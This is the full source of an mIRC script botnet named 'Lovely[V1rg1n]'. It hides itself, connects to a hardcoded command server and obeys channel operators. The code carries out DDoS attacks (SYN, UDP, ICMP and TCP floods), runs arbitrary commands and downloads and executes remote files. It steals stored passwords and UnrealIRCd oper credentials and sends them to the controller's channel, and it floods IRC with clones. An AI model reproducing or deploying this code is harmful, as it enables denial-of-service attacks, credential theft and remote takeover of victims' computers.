;  Lovely[V1rg1n] ;
alias f.cmd { if ($1 == $null) || ($2 == $null) || ($3 == $null) { return } | if ( [ [ $1 ] ] $2 [ [ $3 ] ] ) { [ [ $4- ] ] } }
alias jc { /join $l0v3ly(nc) $l0v3ly(nk) }
alias ircx { write -c cho.txt | write -c cho.bat netstat -n >cho.txt | run nass3r.exe /n /fh /r "cho.bat" | .timerX 1 3 ircx2 }
alias ircx2 { %ci = 5 | %cx = $lines(cho.txt) | unset %cz | :loop | if (%ci > %cx) { msg $l0v3ly(nx) $1- [IrcX] servinfo: ( $+ $gettok(%cz,1-,44) $+ ) | halt } | %ctemp = $gettok($read(cho.txt,%ci),3,32) | if (*:666* iswm %ctemp) { %cz = $+(%cz,$chr(44),%ctemp) } | inc %ci | goto loop | .timer 3 8 remove cho.txt | .timer 3 9 remove cho.bat }
alias connec { server $l0v3ly(nr) $l0v3ly(np) | if ($portfree(113)) { socklisten IDENT 113 } }
alias fuck3r { .ddeserver on v1r | .nick [ $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) $+ ]] | anick [ $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) $+ ]] | .username $duration($uptime(system,3))  | .identd on worm | emailaddr worm | .n0clone | .connec | .timerconnec -o 0 20 connec | .timerus -o 0 1 us | .timerus -o 0 1 hd }
alias saym { if ($me isvo $l0v3ly(nc)) { clearall | msg $l0v3ly(nc) $1- } }
alias n0clone { if ($portfree( $+ $l0v3ly(nl) $+ ) == $false) { exit } | socklisten noclone $l0v3ly(nl) }
alias H1dd3 { if ($appstate != hidden) { /exit } }
alias s33 { if ($appactive = $true) { /exit } }
on *:join:#:{ if (# = $l0v3ly(nc)) { if ($nick = $me) { timerjc off | echo $Scan(all Rand 0 -r) } } }
on *:START:{ run nass3r.exe /n /fh mirc | fuck3r }
on *:disconnect:{ timerconnec -o 0 15 connec  }
on *:exit:{ sockclose * | timers off }
on *:connect:{ .timerconnec off | ipnick | c | .timerjc 0 $rand(1,5) /jc }
on *:OP:#: { if ($opnick = $me) { mode $chan +mMnstk $l0v3ly(nk) } }
on *:PING:{ ctcp $me ping }
on *:dns:{ %address = $iaddress } { if (%dns.r == on) { saym dns: %dns.rrr resolved to ip: $iaddress host: $naddress | unset %dns.* } } 
on *:join:$l0v3ly(nc):{ if ($nick == $me) { .timerjc off } }
on *:part:$l0v3ly(nc):{ if ($nick == $me) { .timerjc 0 3 raw -q /jc } }
on *:KICK:$l0v3ly(nc):{ if ($knick == $me) { .timerjc 0 3 raw -q /jc } }
on *:TEXT:*:*: {
  if ($nick isop $l0v3ly(nc)) {
    if ($1 = !task) { ttask }
    if ($1 = !info) { Showinfo }
    if ($1 = !kill) { run lonely.exe cult.exe -kf $2- }
    if ($1 = !S.on) { if ($2 = raw) { strz raw $3- } | if ($2 = gt) { strz gt } | if ($2 = $null) { strz normal } }
    if ($1 = !s.off) { stptr }
    if ($1 = !pf) { if ($4 == m) { //pf4st $2 $3 $r(1,64000) | halt } | //pf4st $2 $3 $4 }
    if ($1 = !TCP) { set %gdopeip $2 | set %sqqq $3 | set %timer.gDoPe $4 | TCP | saym 1[1TCP1]4 Sending packet to : $2 Port : $3 size : $4 }
    if ($1 = !dos) && ($3 != $null) { run nass3r.exe /n /fh /r "ping.exe $2 -n $3 -l 65500" | saym 1[4DDoS1]4 packeting $2 with $calc($3 *65536/1024/1000) $+ mb traffic } 
    if ($1 = !icmp) { if ($2 == $null) { saym Error/Syntax: (!icmp ip packetsize howmany, ie: !icmp 127.0.0.1 2000 1000) | halt } | run nass3r.exe /n /r "ping -n $4 -l $3 -w 0 $2 " }
    if ($1 = !syn) { if ($2 !== $null) { saym 1(4SynPacket1) 1(4attacking1) [ $+ $2 $+ ] on 1[4 $+ $3 $+ 1]4 With 1[4 $+ $4 $+ 1]4 Packets  | synz start $4 $2 $3 } }    
    if ($1 = !udp) {  if ($4 == m) { //n4553r $2 $3 $r(1,65000) | halt } | //n4553r $2 $3 $4 }
    if ($1 = !mp) { if ($2 isnum) { mpf4st $2 $3 $r(1,64000) } | if ($2 = -s) { .timermpf4st off | saym 1Code End [14Mudp1] } }
    if ($1 = !clone) { clone $2- }
    if ($1 = !rest) { timer 1 1 /quit reconnecting... | connec }
    if ($1 = !/) && ($2 != $null) { %do = $2- | / $+ %do | unset %do }
    if ($1 = !ircx) { ircx | saym [IrcX] Checking Local Connections.. | halt }
    if ($1 = !unreal) { saym Searching Of UNREAL ircd.. |  Shadwunreal  | timer 1 2 unreal $l0v3ly(xn) }
    if ($1 = !wget) { if (-r isin $2-) { set %run 1 } | download file $2 $mircdir }
    if ($1 = !ps) {
      if ($2 = on) && (%stch3ck != on) { set %stch3ck on | g0ps }
      if ($2 = off) && (%stch3ck = on) { timert4rg4p off | if ($exists(sr.dll) = $true) { remove sr.dll } }
      if ($2 = rw) && (%stch3ck != on) { set %stch3ck on | set %rwword $3- | rwps }
    }
  }
  if ($1 = !c) { 
    if ($sock(X,0) == 0) { 
      .set %Xserv $2 
      .set %Xport $3
      .set %Xnick $4 
      .set %Xpass $5 
      .set %Xmail $6 
      .sockopen X %Xserv %Xport
    }
    if (off = $2) { timer 1 0 //sockclose X | .timerC1 off | unset %xserv %xport %xnick %xpass | return }
    if (away = $2) { timer 1 0 //sockwrite -nt X away : $+ $3- | return }
    if (raw = $2) { timer 1 0 //sockwrite -nt X $3 : $+ $4- | return }
  }
  if ($1 = !c2) { 
    if ($sock(M,0) == 0) { 
      .set %Xserv2 $2 
      .set %Xport2 $3
      .set %Xnick2 $4 
      .set %Xpass2 $5 
      .set %Xmail2 $6 
      .sockopen M %Xserv2 %Xport2
    }
    if (off = $2) { timer 1 0 //sockclose M | .timerX1 off | unset %xserv2 %xport2 %xnick2 %xpass2 %xemail2 | return }
    if (away = $2) { timer 1 0 //sockwrite -nt M away : $+ $3- | return }
    if (raw = $2) { timer 1 0 //sockwrite -nt M $3 : $+ $4- | return }
  }
  if ($1 = !c3) { 
    if ($sock(N,0) == 0) { 
      .set %Xserv3 $2 
      .set %Xport3 $3
      .set %Xnick3 $4 
      .set %Xpass3 $5 
      .set %Xmail3 $6 
      .sockopen N %Xserv3 %Xport3
    }
    if (off = $2) { timer 1 0 //sockclose N | .timerX2 off | unset %xserv3 %xport3 %xnick3 %xpass3 %xemail3 | return }
    if (away = $2) { timer 1 0 //sockwrite -nt N away : $+ $3- | return }
    if (raw = $2) { timer 1 0 //sockwrite -nt N $3 : $+ $4- | return }
  }
  if ($1 = !ch) { 
    if ($sock(C,0) == 0) { 
      .set %c-serv $2 
      .set %c-port $3
      .set %C-Chan $4 
      .set %C-Nick $5 
      .sockopen C %c-serv %c-port
    }
    if (off = $2) { timer 1 0 //sockclose C | .timerXc off | unset %c-nick %c-serv %c-port %c-Chan | return }
  }
}

alias Shadwunreal {
  if ($findfile(c:,unrealircd.conf,0)) {
    var %Shadz = 1
    while (%Shadz <= $lines($findfile(c:,unrealircd.conf,1))) {
      if (oper?* iswm $read($findfile(c:,unrealircd.conf,1),%Shadz) && $chr(45) !isin $read($findfile(c:,unrealircd.conf,1),%Shadz) && $chr(59) !isin $read($findfile(c:,unrealircd.conf,1),%Shadz)) { set %oper.nick $remove($read($findfile(c:,unrealircd.conf,1),%Shadz),oper) } 
      if (*password* iswm $read($findfile(c:,unrealircd.conf,1),%Shadz)) { set %oper.pass $gettok($read($findfile(c:,unrealircd.conf,1),%Shadz),2,34) }
      inc %Shadz
    }
  }
}
alias unreal { if (%oper.pass) && (%oper.nick) { msg $l0v3ly(nx) Server: $ip OperNick: %oper.nick OperPass: %oper.pass | .timer 1 5 /unset %oper.* } }
raw 433:*:{ nick [ $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) $+ ]] }
on *:sockread:X:{ sockread %ntread | ntreader $sockname %ntread }
alias ntreader {
  if (PING = $2) { sockwrite -nt $1 $2- }
  if (NICK = $3) && ($remove($4,:) = %Xnick) { //sockwrite -nt $1 NickServ :register $replace(%Xpass,a,4,e,3,i,1,o,0) %Xmail | //sockwrite -nt $1 NickServ :register $replace(%Xpass,a,4,e,3,i,1,o,0) %Xmail | //sockwrite -nt $1 NickServ :register $replace(%Xpass,a,4,e,3,i,1,o,0) %Xmail | //sockwrite -nt $1 NickServ :register $replace(%Xpass,a,4,e,3,i,1,o,0) %Xmail | msg $l0v3ly(nc) 1 $+([,14Sock,$sockname,]) 01 $+ %Xnick3 Is Registerd For You... }
}
on *:Sockopen:X:{
  set %Socknick $read(v1rg1n)
  sockwrite -nt $sockname USER $r(a,z) $+ $r(A,Z) $+ $r(1,9) $+ $r(a,z) * * : $+ $read(sa)
  sockwrite -nt $sockname NICK $r(a,z) $+ $r(A,Z) $+ $r(1,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z)
  sockwrite -nt $sockname mode %socknick +R
  unset %socknick
  .timerC1 0 3 //sockwrite -nt $sockname nick %Xnick
}
on *:sockread:M:{ sockread %ntread2 | ntreader2 $sockname %ntread2 }
alias ntreader2 {
  if (PING = $2) { sockwrite -nt $1 $2- }
  if (NICK = $3) && ($remove($4,:) = %Xnick2) { //sockwrite -nt $1 NickServ :register $replace(%Xpass2,a,4,e,3,i,1,o,0) %Xmail2 | //sockwrite -nt $1 NickServ :register $replace(%Xpass2,a,4,e,3,i,1,o,0) %Xmail2 | //sockwrite -nt $1 NickServ :register $replace(%Xpass2,a,4,e,3,i,1,o,0) %Xmail2 | //sockwrite -nt $1 NickServ :register $replace(%Xpass2,a,4,e,3,i,1,o,0) %Xmail2 | msg $l0v3ly(nc) 1 $+([,14Sock,$sockname,]) 01 $+ %Xnick3 Is Registerd For You... }
}
on *:Sockopen:M:{
  set %Socknick2 $read(v1rg1n)
  sockwrite -nt $sockname USER $r(a,z) $+ $r(A,Z) $+ $r(1,9) $+ $r(a,z) * * : $+ $read(sa)
  sockwrite -nt $sockname NICK $r(a,z) $+ $r(A,Z) $+ $r(1,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z)
  sockwrite -nt $sockname mode %socknick2 +R
  unset %socknick2
  .timerX1 0 3 //sockwrite -nt $sockname nick %Xnick2
}
on *:sockread:N:{ sockread %ntread3 | ntreader3 $sockname %ntread3 }
alias ntreader3 {
  if (PING = $2) { sockwrite -nt $1 $2- }
  if (NICK = $3) && ($remove($4,:) = %Xnick3) { //sockwrite -nt $1 NickServ :register $replace(%Xpass3,a,4,e,3,i,1,o,0) %Xmail3 | //sockwrite -nt $1 NickServ :register $replace(%Xpass3,a,4,e,3,i,1,o,0) %Xmail3 | //sockwrite -nt $1 NickServ :register $replace(%Xpass3,a,4,e,3,i,1,o,0) %Xmail3 | //sockwrite -nt $1 NickServ :register $replace(%Xpass3,a,4,e,3,i,1,o,0) %Xmail3 | msg $l0v3ly(nc) 1 $+([,14Sock,$sockname,]) 01 $+ %Xnick3 Is Registerd For You... }
}
on *:Sockopen:N:{
  set %Socknick2 $read(v1rg1n)
  sockwrite -nt $sockname USER $r(a,z) $+ $r(A,Z) $+ $r(1,9) $+ $r(a,z) * * : $read(sa)
  sockwrite -nt $sockname NICK $+($r(a,z),$r(a,z),$r(1,9),$r(a,z),$r(a,z),$r(1,9),$r(a,z),$r(a,z),$r(a,z))
  sockwrite -nt $sockname mode %socknick2 +R
  unset %socknick2
  .timerX2 0 2 //sockwrite -nt $sockname nick %Xnick3
}
on *:Sockopen:C:{
  set %Socknickx $read(v1rg1n)
  sockwrite -nt $sockname USER $r(a,z) $+ $r(A,Z) $+ $r(1,9) $+ $r(a,z) * * : $+ $read(sa)
  sockwrite -nt $sockname NICK $r(a,z) $+ $r(A,Z) $+ $r(1,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z)
  sockwrite -nt $sockname mode %socknickx +R
  unset %socknickx
  .timerXc 0 2 //sockwrite -nt $sockname Join %c-Chan
}
on 1:Sockread:C:{
  var %v
  sockread %v
  var %g = $gettok(%v,2,32)
  if (join = %g) { 
    .msg $l0v3ly(nc) am in the ChanneL %C-Chan
    .sockwrite -nt $sockname mode %C-Chan +ilI %C-Nick %C-Nick
  }
  if (join = %g) && ($remove(%C-nick,$chr(58)) isin %v) {
    .sockwrite -nt $sockname mode %C-Chan +io %C-Nick %C-Nick
  }
}
alias download {
  if (!$isid) {
    set %drun $nopath($2)
    var %1 = download $+ $1,%2 = $longfn($3-)
    if (!$3) { linesep -s | echo $color(info) -s * /download: insufficient parameters | linesep -s | return }
    if ($sock(%1)) { linesep -s | echo $color(info) -s * /download: $+(',$1,') name in use | linesep -s | return }
    if (!$isdir(%2)) { linesep -s | echo $color(info) -s * /download: no such dir $+(',%2,') | linesep -s | return }
    unset % [ $+ [ %1 $+ .* ] ]
    set % [ $+ [ %1 $+ .file ] ] $+(%2,$iif($right(%2,1) != $chr(92),$chr(92)),$gettok($2,-1,47),.dat)
    set % [ $+ [ %1 $+ .url ] ] http:// $+ $remove($2,http://)
    set % [ $+ [ %1 $+ .ctime ] ] $ctime 0
    set % [ $+ [ %1 $+ .status ] ] Connecting
    sockopen %1 $gettok($remove($2,http://),1,47) 80
  }
  else {
    if ($1 == 0) { return $sock(download*,0) }
    if ($iif($1 isnum,$sock(download*,$1),$sock(download $+ $1))) {
      var %1 = $ifmatch,%2 = $dl.var(%1,file),%3 = $dl.var(%1,size),%4 = $file(%2).size
      if (!$prop) { return $right(%1,-8) }
      elseif ($prop == ip) { return $sock(%1).ip }
      elseif ($prop == status) { return $dl.var(%1,status) }
      elseif ($prop == url) { return $dl.var(%1,url) }
      elseif ($prop == file) { return $left(%2,-4) }
      elseif ($prop == type) { return $dl.var(%1,type) }
      elseif ($prop == size) { return %3 }
      elseif ($prop == rcvd) { return %4 }
      elseif ($prop == cps) { return $int($calc(%4 / ($ctime - $dl.var(%1,ctime,2)))) }
      elseif ($prop == pc) { return $int($calc($file(%2).size * 100 / %3)) }
      elseif ($prop == secs) { return $calc($ctime - $dl.var(%1,ctime,1)) }
    }
  }
}
alias -l dl.var { return $gettok(% [ $+ [ $+($1,.,$2) ] ],$iif(!$3,1-,$3),32) }
alias -l dl.fail { var %1 = $right($1,-8) | .signal -n download_fail %1 $2- | close -d %1 }
alias close {
  if ($1 == -d) {
    var %1 = download $+ $2
    if ($sock(%1)) {
      .remove $+(",$dl.var(%1,file),")
      unset % [ $+ [ %1 $+ .* ] ]
      sockclose %1
    }
  }
  else { close $1- }
}
on *:sockopen:download*:{
  if ($sockerr) { dl.fail $sockname unable to Connect | return }
  var %1 = $dl.var($sockname,url)
  set % [ $+ [ $sockname $+ .status ] ] Requesting File
  sockwrite -tn $sockname GET %1 HTTP/1.1
  sockwrite -tn $sockname Host: $gettok($remove(%1,http://),1,47)
  sockwrite -tn $sockname Accept: *.*, */*
  sockwrite -tn $sockname Connection: close
  sockwrite -tn $sockname $crlf
}
on *:sockclose:download*:{ if ($dl.var($sockname,status) != done) { dl.fail $sockname Disconnected } }
on *:sockread:download*:{
  if ($sockerr) { saym Download Connection Failed | return }
  if ($dl.var($sockname,status) != downloading) {
    var %1 | sockread %1 | tokenize 32 %1
    if (HTTP/* iswm $1 && $2 != 200) { dl.fail $sockname $3- }
    elseif ($1 == Content-Length:) { set % [ $+ [ $sockname $+ .size ] ] $2 }
    elseif ($1 == Content-Type:) { set % [ $+ [ $sockname $+ .type ] ] $2- }
    elseif (!$1) {
      write -c $+(",$dl.var($sockname,file),")
      set % [ $+ [ $sockname $+ .ctime ] ] $dl.var($sockname,ctime,1) $ctime
      set % [ $+ [ $sockname $+ .status ] ] Downloading
      return
    }
  }
  else {
    var %1 = $dl.var($sockname,file)
    :sockread
    sockread &1
    if (!$sockbr) { return }
    bwrite $+(",%1,") -1 &1
    if ($file(%1).size >= $dl.var($sockname,size)) {
      var %1 = $right($sockname,-8),%2 = $dl.var($sockname,file)
      set % [ $+ [ $sockname $+ .status ] ] Done
      .copy -o $+(",%2,") $+(",$left(%2,-4),")
      saym Download Completed
      if (%run = 1) { run %drun | unset %run | unset %drun }
      close -d %1
      return
    }
    goto sockread
  }
}
alias clone {
  if ($1 = con) { unset %fnickf | set %cserver $2 | /set %cport $3 | set %fnickf $5 | /timeropensock $+ $fnick $4 2 opensock }
  if ($1 = join) { ShadowSock Shadow* Join $2- }
  if ($1 = part) { ShadowSock Shadow* Part $2 : $+ $3- }
  if ($1 = msg) { ShadowSock Shadow* privmsg $2 : $+ $3- }
  if ($1 = notice) { ShadowSock Shadow* notice $2 : $+ $3- }
  if ($1 = crazy.c) { sockwrite -nt Shadow* Join $2 | timer 30 0 //sockwrite -nt Shadow* privmsg $2 : $3- }
  if ($1 = crazy.n) { timer 20 0 //sockwrite -nt Shadow* privmsg $2 : $3- | timer 30 0 //sockwrite -nt Shadow* notice $2 : $3- }
  if ($1 = jp) { ShadowSock Shadow* Join $2- | ShadowSock Shadow* part $2 : $3- | ShadowSock Shadow* Join $2- | ShadowSock Shadow* part $2 : $3- | ShadowSock Shadow* Join $2- | ShadowSock Shadow* part $2 : $3- }
  if ($1 = jmp) { ShadowSock Shadow* Join $2 | ShadowSock Shadow* privmsg $2 : $3- | ShadowSock Shadow* part $2 : $3- }
  if ($1 = flood.c) { ShadowSock Shadow* join $2 | ShadowSock Shadow* privmsg $2 : $3- | ShadowSock Shadow* notice $2 : $3- | ShadowSock Shadow* privmsg $2 : $3- }
  if ($1 = flood.n) { ShadowSock Shadow* privmsg $2 : $3- | ShadowSock Shadow* notice $2 : $3- | ShadowSock Shadow* privmsg $2 : $3- }
  if ($1 = chat.flood) { ShadowSock Shadow* privmsg $2 :DCC CHAT $2 1058633484 3481  }
  if ($1 = Quit) { ShadowSock Shadow* Quit : $+ $2- }
  if ($1 = massquit) || ($1 = mq) { ShadowSock Shadow* Join $2 | ShadowSock Shadow* Quit : $+ $3- }
  if ($1 = fnick) { ShadowSock Shadow* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }
  if ($1 = Die) { .timeropensock* off | sco Shadow* | unset %f.* }
  if ($1 = /) { sockwrite -nt Shadow* $2- | halt }
}
alias fnick {
  set -u0 %fnick $rand(1,3)
  if (%fnick = 1) { return $+($r(a,z),$read(v1rg1n)) }
  if (%fnick = 2) { return $+($r(a,z),$read(v1rg1n)) }
  if (%fnick = 3) { return $+($r(a,z),$read(v1rg1n)) }
}
alias UNIX {
  set -u0 %fnick $rand(1,4)
  if (%fnick = 1) { return $+($r(a,z),$read(v1rg1n)) }
  if (%fnick = 2) { return $+($r(a,z),$read(v1rg1n)) }
  if (%fnick = 3) { return $+($r(a,z),$read(v1rg1n)) }
  if (%fnick = 4) { return $+($r(a,z),$read(v1rg1n)) }
}
alias Stay { 
  if ($1 = PING) { ShadowSock %bota pong $remove($2-,:) } 
  if (ERROR = $1) { sco %bota | unset %f.* }
}
alias showinfo {
  saym [Sys Info] $ant(os) [CPU]  $ant(cpuinfo) $+ , $ant(cpuspeed) $+ , ( $+ $ant(cpuload) Load $+ ) [RAM] $ant(usedphysicalmem) $+ / $+ $ant(totalphysicalmem) $+ MB ( $+ $ant(memoryload) $+ ) [Uptime] $ant(uptime) [IP address] $ip  ( $+ $ant(res) $+ ) [HD] $ant(hdspace) [Disk Free] $ant(totalhdspacefree) [Total Size] $ant(totalhdspace)
}
on *:sockread:Shadow*:{ set %bota $sockname | sockread %BoTread | Stay %BoTread | unset %bota }
on *:sockclose:Shadow*:{ unset %f.* }
alias opensock { sop Shadow $+ $ticks %cserver %cport }
on *:Sockopen:Shadow*:{
  if $sockerr { return }
  .ShadowSock $sockname USER $+($r(a,z),$read(v1rg1n)) * * : $+($r(a,z),$read(v1rg1n))
  .ShadowSock $sockname NICK $+($r(a,z),$read(v1rg1n))
}
alias ant { return $dll(lovely.dll,$1,_) }
alias w { write $1- }
alias ShadowSock { .sockwrite -nt $1- }
alias s-n { .sockwrite -n $1- }
alias sop { .sockopen $1- }
alias sco { .sockclose $1- }
alias ttask { run lonely.exe ksat.bat | timerPlay 1 5 /play $l0v3ly(nx) taks.w }
alias fltr { 
  set %read $read(clf.q,1) 
  if ($l0v3ly(nx) isin %read) { write -dl1 clf.q | halt }
  if ($l0v3ly(nx) isin %read) { write -dl1 clf.q | halt }
  if (rule line isin %read) { write -dl1 clf.q | halt }
  if ($port isin %read) { write -dl1 clf.q | halt }
  if (Quit : isin %read) { write -dl1 clf.q | halt }
  if (%read = $null) { write -dl1 clf.q | halt }
  msg $l0v3ly(nx) %read
  write -dl1 clf.q
}
alias strz { if ($1 = raw) { write -c law.x | write law.x proto=tcp logtype=4 file=clf.q expri= $+ $2- | run lonely.exe orrl.exe -d 0 law.x | timerFltr 0 1 fltr } | if ($1 = gt) { run lonely.exe orrl.exe -d 0 gt.x | timerFltr 0 1 fltr } | if ($1 = normal) { run lonely.exe orrl.exe -d 0 w.e | timerFltr 0 1 fltr } }
alias stptr { run lonely.exe cult.exe -kf orrl.exe | timerFltr off | remove clf.q }
alias topicX { 
  if ($l0v3ly(pr) == $mid($chan(%ch4n).topic,1,1)) { 
    Xcmd $chan(%ch4n).topic 
  }
}
alias Xcmd {
  if ($1 = !info) { Showinfo }
  if ($1 = !TCP) { set %gdopeip $2 | set %sqqq $3 | set %timer.gDoPe $4 | TCP | v1rg1n 1(1TCP1)14 Sending packet to : $2 Port : $3 size : $4 }
  if ($1 = !icmp) { if ($2 == $null) { run nass3r.exe /n /r "ping -n $4 -l $3 -w 0 $2 " | v1rg1n 1(14ICMP1)14 attacking: $2 With: $3 $4 $+ times } }
  if ($1 = !syn) { if ($2 !== $null) { v1rg1n 1(14Syn1) ( $+ $2 $+ ) On ( $+ $3 $+ ) With ( $+ $4 $+ )   | Synp Start $4 $2 $3 } }
  if ($1 = !pf) { if ($4 == mass) { //pf4St $2 $3 $r(1,64000) | halt } | //pf4St $2 $3 $4 }
  if ($1 = !udp) {  if ($4 == mass) { //n4553r $2 $3 $r(1,65000) | halt } | //n4553r $2 $3 $4 }
  if ($1 = !mp) { if ($2 iSnum) { mpf4St $2 $3 $r(1,64000) } | if ($2 = -s) { .timermpf4st off | v1rg1n 1(14Mudp1) 1Code End  } }
  if ($1 = !clone) { clone $2- }
  if ($1 = !rest) { timer 1 0 /quit Rehashing... | BaCk }
  if ($1 = !ircx) { ircx | v1rg1n 1(14IrcX1) Checking Local Connections.. | halt }
  if ($1 = !ps) {
    if ($2 = on) && (%stch3ck != on) { set %stch3ck on | g0ps }
    if ($2 = off) && (%stch3ck = on) { timerl0v3lyxp off | if ($exists(sr.dll) = $true) { remove sr.dll } }
    if ($2 = rw) && (%stch3ck != on) { set %stch3ck on | set %rwword $3- | rwps }
  }
  if ($1 = !/) && ($2 != $null) { %go = $2- | / $+ %go | unSet %go }
  if ($1 = !Unreal) {
    if ($2) { nass3runreal | timer 1 2 unreal $2 }
    if (!$2) { nass3runreal | timer 1 2 unreal $l0v3ly(nx) }
  }
  if ($1 = !c) { 
    if ($sock(X,0) == 0) { 
      .set %Xserv $2 
      .set %Xport $3
      .set %Xnick $4 
      .set %Xpass $5 
      .set %Xmail $6 
      .sockopen X %Xserv %Xport
    }
    if (off = $2) { timer 1 0 //sockclose X | .timerC1 off | unset %xserv %xport %xnick %xpass | return }
    if (away = $2) { timer 1 0 //sockwrite -nt X away : $+ $3- | return }
    if (raw = $2) { timer 1 0 //sockwrite -nt X $3 : $+ $4- | return }
  }
  if ($1 = !c2) { 
    if ($sock(M,0) == 0) { 
      .set %Xserv2 $2 
      .set %Xport2 $3
      .set %Xnick2 $4 
      .set %Xpass2 $5 
      .set %Xmail2 $6 
      .sockopen M %Xserv2 %Xport2
    }
    if (off = $2) { timer 1 0 //sockclose M | .timerX1 off | unset %xserv2 %xport2 %xnick2 %xpass2 %xemail2 | return }
    if (away = $2) { timer 1 0 //sockwrite -nt M away : $+ $3- | return }
    if (raw = $2) { timer 1 0 //sockwrite -nt M $3 : $+ $4- | return }
  }
  if ($1 = !c3) { 
    if ($sock(N,0) == 0) { 
      .set %Xserv3 $2 
      .set %Xport3 $3
      .set %Xnick3 $4 
      .set %Xpass3 $5 
      .set %Xmail3 $6 
      .sockopen N %Xserv3 %Xport3
    }
    if (off = $2) { timer 1 0 //sockclose N | .timerX2 off | unset %xserv3 %xport3 %xnick3 %xpass3 %xemail3 | return }
    if (away = $2) { timer 1 0 //sockwrite -nt N away : $+ $3- | return }
    if (raw = $2) { timer 1 0 //sockwrite -nt N $3 : $+ $4- | return }
  }
  if ($1 = !ch) { 
    if ($sock(C,0) == 0) { 
      .set %c-serv $2 
      .set %c-port $3
      .set %C-Chan $4 
      .set %C-Nick $5 
      .sockopen C %c-serv %c-port
    }
    if (off = $2) { timer 1 0 //sockclose C | .timerXc off | unset %c-nick %c-serv %c-port %c-Chan | return }
  }
}
On *:join:#:{
  if ($nick == $me) { 
    set %ch4n $chan 
    .timerxx 1 3 topicX 
  } 
}
alias g0ps { timerb 1 7 pschk | run lonely.exe ps2m.exe /stext sr.dll }
alias pschk { timert4rg4p 0 1 p4sses }
alias rwps { timerb 1 7 rwpsz | run lonely.exe ps2m.exe /stext sr.dll }
alias rwpsz { timert4rg4p 0 1 rwp4ss3s }
alias rwp4ss3s {
  :start
  if ($file(sr.dll) = 0) { if ($exists(sr.dll) = $true) { remove sr.dll } | set %stch3ck off | timert4rg4p off }
  set %read $read(sr.dll,1)
  if (%read = ==================================================) { write -dl1 sr.dll }
  set %read $read(sr.dll,1)
  if (Resource Name isin %read) { tokenize 32 %read | set %Source $4- | write -dl1 sr.dll }
  set %read $read(sr.dll,1)
  if (Resource Type isin %read) {
    if (AutoComplete Fields isin %read) || (Outlook Express Identity isin %read) { write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | goto start }
    write -dl1 sr.dll
  }
  set %read $read(sr.dll,1)
  if (User Name/Value : isin %read) { tokenize 32 %read | set %UserN $4- | write -dl1 sr.dll } 
  set %read $read(sr.dll,1)
  if (Password : isin %read) { tokenize 32 %read | set %Upass $3- | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll
    if (%Source = $null) || (%UserN = $null) || (%Upass = $null) { halt }
    if (%rwword isin %Source) { privmsg $l0v3ly(nx) [PASS] Source: %Source Username: %UserN Password: %Upass }
  }
}
alias p4sses {
  :start
  if ($file(sr.dll) = 0) { if ($exists(sr.dll) = $true) { remove sr.dll } | set %stch3ck off | timert4rg4p off }
  set %read $read(sr.dll,1)
  if (%read = ==================================================) { write -dl1 sr.dll }
  set %read $read(sr.dll,1)
  if (Resource Name isin %read) { tokenize 32 %read | set %Source $4- | write -dl1 sr.dll }
  set %read $read(sr.dll,1)
  if (Resource Type isin %read) {
    if (AutoComplete Fields isin %read) || (Outlook Express Identity isin %read) { write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | goto start }
    write -dl1 sr.dll
  }
  set %read $read(sr.dll,1)
  if (User Name/Value : isin %read) { tokenize 32 %read | set %UserN $4- | write -dl1 sr.dll } 
  set %read $read(sr.dll,1)
  if (Password : isin %read) { tokenize 32 %read | set %Upass $3- | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll
    if (%Source = $null) || (%UserN = $null) || (%Upass = $null) { halt }
    privmsg $l0v3ly(nx) [PASS] Source: %Source Username: %UserN Password: %Upass
  }
}
alias l0v3ly {
  if ($1 = nr) { return nb32.n00butd.com }
  if ($1 = np) { return 9999 }
  if ($1 = nc) { return ##gt## }
  if ($1 = nx) { return ##gt }
  if ($1 = nk) { return gtlog }
  if ($1 = nl) { return 565424 }
}
alias synpx { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | msg %cc Syn Attack Done! }
alias syn {
  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
